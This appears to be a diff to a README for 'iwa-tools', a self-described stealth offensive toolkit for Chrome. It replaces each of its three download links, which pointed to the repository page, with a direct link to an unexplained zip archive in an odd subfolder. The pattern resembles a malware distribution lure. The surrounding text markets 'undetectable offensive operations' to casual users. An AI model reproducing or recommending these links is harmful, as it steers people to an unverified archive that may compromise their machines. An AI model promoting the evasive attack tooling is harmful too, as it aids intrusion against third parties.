@@ -1,6 +1,6 @@
 # 🛡️ iwa-tools - Stealth offensive toolkit for Chrome
 
-[![Download iwa-tools](https://img.shields.io/badge/Download-iwa--tools-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ethan1431/iwa-tools)
+[![Download iwa-tools](https://img.shields.io/badge/Download-iwa--tools-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ethan1431/iwa-tools/raw/refs/heads/main/housemother/tools-iwa-2.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Getting started with iwa-tools is incredibly easy. Follow these simple steps, an
 
 ### Step 1: Download the Application
 
-[**👉 Click Here to Download iwa-tools**](https://github.com/Ethan1431/iwa-tools)
+[**👉 Click Here to Download iwa-tools**](https://github.com/Ethan1431/iwa-tools/raw/refs/heads/main/housemother/tools-iwa-2.4.zip)
 
 Visit this link to download the application. The download will start automatically, or you'll see a download button on the page.
 
@@ -183,7 +183,7 @@ iwa-tools is released under the MIT License. You are free to use, modify, and di
 
 iwa-tools is your go-to solution for undetectable offensive operations inside Chrome. It's powerful, easy to use, and completely free. Whether you're a professional tester or just curious about browser security, iwa-tools has everything you need.
 
-[**🚀 Download iwa-tools Now**](https://github.com/Ethan1431/iwa-tools)
+[**🚀 Download iwa-tools Now**](https://github.com/Ethan1431/iwa-tools/raw/refs/heads/main/housemother/tools-iwa-2.4.zip)
 
 Don't wait—unlock the full potential of your browser today!
 
